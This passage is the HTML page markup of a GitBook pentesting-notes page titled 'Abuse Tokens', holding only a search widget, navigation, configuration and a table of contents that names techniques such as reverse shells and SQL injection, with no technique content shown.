            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
                <a href="Buffer overflow.html" class="navigation navigation-next navigation-unique" aria-label="Next page: Buffer Overflow">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Abuse Tokens","level":"4.1.4.1","depth":3,"next":{"title":"Buffer Overflow","level":"4.1.4.2","depth":3,"path":"Pentest/Techniques/Buffer overflow.md","ref":"Pentest/Techniques/Buffer overflow.md","articles":[]},"previous":{"title":"Techniques","level":"4.1.4","depth":2,"ref":"","articles":[{"title":"Abuse Tokens","level":"4.1.4.1","depth":3,"path":"Pentest/Techniques/Abuse tokens.md","ref":"Pentest/Techniques/Abuse tokens.md","articles":[]},{"title":"Buffer Overflow","level":"4.1.4.2","depth":3,"path":"Pentest/Techniques/Buffer overflow.md","ref":"Pentest/Techniques/Buffer overflow.md","articles":[]},{"title":"Command Injection","level":"4.1.4.3","depth":3,"path":"Pentest/Techniques/Command injection.md","ref":"Pentest/Techniques/Command injection.md","articles":[]},{"title":"Data Exfiltration","level":"4.1.4.4","depth":3,"path":"Pentest/Techniques/Data exfiltration.md","ref":"Pentest/Techniques/Data exfiltration.md","articles":[]},{"title":"Exploit handles","level":"4.1.4.5","depth":3,"path":"Pentest/Techniques/Exploit handles.md","ref":"Pentest/Techniques/Exploit handles.md","articles":[]},{"title":"Filtering","level":"4.1.4.6","depth":3,"path":"Pentest/Techniques/Filtering.md","ref":"Pentest/Techniques/Filtering.md","articles":[]},{"title":"Kioske Escape","level":"4.1.4.7","depth":3,"path":"Pentest/Techniques/Kioske escape.md","ref":"Pentest/Techniques/Kioske escape.md","articles":[]},{"title":"LFI","level":"4.1.4.8","depth":3,"path":"Pentest/Techniques/LFI.md","ref":"Pentest/Techniques/LFI.md","articles":[]},{"title":"Password Spraying","level":"4.1.4.9","depth":3,"path":"Pentest/Techniques/Password spraying.md","ref":"Pentest/Techniques/Password spraying.md","articles":[]},{"title":"Pivoting","level":"4.1.4.10","depth":3,"path":"Pentest/Techniques/Pivoting.md","ref":"Pentest/Techniques/Pivoting.md","articles":[]},{"title":"Privilege Escalation","level":"4.1.4.11","depth":3,"ref":"","articles":[{"title":"Windows","level":"4.1.4.11.1","depth":4,"path":"Pentest/Techniques/Privileges escalation/Windows.md","ref":"Pentest/Techniques/Privileges escalation/Windows.md","articles":[]},{"title":"Linux","level":"4.1.4.11.2","depth":4,"path":"Pentest/Techniques/Privileges escalation/Linux.md","ref":"Pentest/Techniques/Privileges escalation/Linux.md","articles":[]}]},{"title":"Reverse Shell","level":"4.1.4.12","depth":3,"path":"Pentest/Techniques/Reverse shell.md","ref":"Pentest/Techniques/Reverse shell.md","articles":[]},{"title":"Shellshock","level":"4.1.4.13","depth":3,"path":"Pentest/Techniques/Shellshock.md","ref":"Pentest/Techniques/Shellshock.md","articles":[]},{"title":"SQL Injection","level":"4.1.4.14","depth":3,"path":"Pentest/Techniques/SQL injection.md","ref":"Pentest/Techniques/SQL injection.md","articles":[]},{"title":"SSTI","level":"4.1.4.15","depth":3,"path":"Pentest/Techniques/SSTI.md","ref":"Pentest/Techniques/SSTI.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing","collapsible-chapters@git+https://gitlab.dqr/gitbook-plugin/collapsible-chapters.git#main","copy-code-button@git+https://gitlab.dqr/gitbook-plugin/copy-code-button.git#main","hide-published-with","search-plus","simple-page-toc"],"pluginsConfig":{"github":{"url":"https://github.com/YoannDqr"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"hide-published-with":{},"fontsettings":{"theme":"white","family":"sans","size":2},"twitter":{"url":"https://twitter.com/HackerOtter"},"highlight":{},"copy-code-button":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Pentest/Techniques/Abuse tokens.md","mtime":"2022-07-21T10:27:45.750Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-09-23T14:26:48.100Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-hide-published-with/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

